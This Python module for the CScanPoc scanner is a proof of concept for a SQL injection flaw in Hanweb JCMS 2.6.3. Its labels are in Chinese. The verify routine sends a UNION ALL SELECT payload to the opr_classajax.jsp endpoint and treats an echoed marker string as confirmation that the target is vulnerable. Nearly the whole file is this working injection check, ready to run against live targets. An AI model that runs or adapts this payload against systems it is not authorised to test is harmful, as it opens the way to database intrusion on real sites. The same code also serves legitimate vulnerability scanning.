# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()


class Vuln(ABVuln):
    vuln_id = 'JCMS_0009'  # 平台漏洞编号，留空
    name = '大汉JCMS系统SQL注入漏洞 版本'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = 'Unknown'  # 漏洞公布时间
    desc = '''
        大汉JCMS系统SQL注入漏洞 版本
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=087751'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Hanweb(大汉)'  # 漏洞应用名称
    product_version = '大汉JCMS 2.6.3'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '6592c128-fe10-43da-b54f-c54fcc1a5bef'
    author = '国光'  # POC编写者
    create_date = '2018-05-13'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payload = "/jcms/jcms_files/jcms1/web1/site/module/sitesearch/opr_classajax.jsp?classid=11%20UNION%20ALL%20SELECT%20NULL,CHR(113)||CHR(122)||CHR(113)||CHR(106)||CHR(113)||CHR(78)||CHR(89)||CHR(99)||CHR(76)||CHR(117)||CHR(72)||CHR(100)||CHR(80)||CHR(72)||CHR(107)||CHR(113)||CHR(107)||CHR(106)||CHR(118)||CHR(113)%20FROM%20DUAL--"
            verify_url = '{target}'.format(target=self.target)+payload
            code, head, res, errcode, _ = hh.http(verify_url)

            if code == 200 and "qzqjqNYcLuHdPHkqkjvq" in res:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
